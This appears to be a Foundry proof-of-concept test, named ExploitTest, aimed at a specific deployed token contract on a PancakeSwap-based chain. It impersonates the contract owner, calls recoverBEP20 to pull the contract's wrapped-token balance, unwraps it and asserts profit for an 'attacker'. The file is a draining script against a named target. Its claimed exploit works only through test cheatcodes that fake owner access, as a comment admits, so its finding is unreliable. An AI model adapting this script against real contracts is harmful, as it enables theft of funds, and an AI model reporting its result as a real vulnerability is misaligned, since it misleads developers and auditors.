// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IWETH interface for withdraw function
interface IWETH {
    function withdraw(uint256) external;
}

// Token interface for owner() and recoverBEP20()
interface Token {
    function owner() external view returns (address);
    function recoverBEP20(address tokenAddress, uint256 tokenAmount) external;
}

// IUniswapV2Router02 interface for WETH()
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
}

// Standard IERC20 interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x222f737285D0B60d8D4f27fA22cE8884c9F119F8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address from contract
        address owner = Token(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Get WETH address from PancakeSwap router
        address weth = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E).WETH();
        vm.label(weth, "WETH");

        // Give attacker some initial ETH for gas
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // 1. Impersonate the owner
        address owner = Token(TARGET).owner();
        vm.startPrank(owner);

        // 2. Check WETH balance of target contract
        IERC20 weth = IERC20(IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E).WETH());
        uint256 wethBalance = weth.balanceOf(TARGET);
        console.log("WETH balance in contract:", wethBalance);

        // 3. If there's WETH, recover it to owner (who we're impersonating)
        if (wethBalance > 0) {
            Token(TARGET).recoverBEP20(address(weth), wethBalance);
        }

        vm.stopPrank();

        // 4. As attacker (owner), convert WETH to ETH
        // First check if we got WETH (owner should have it now)
        uint256 ownerWethBalance = weth.balanceOf(owner);
        if (ownerWethBalance > 0) {
            // Impersonate owner again to withdraw WETH
            vm.startPrank(owner);
            // Convert WETH to ETH
            IWETH(address(weth)).withdraw(ownerWethBalance);
            vm.stopPrank();

            // Transfer ETH from owner to attacker (simulating owner sending to attacker)
            // In real exploit, attacker would be the owner
            vm.prank(owner);
            payable(attacker).transfer(owner.balance);
        }

        // Verify profit
        uint256 finalBalance = address(this).balance;
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
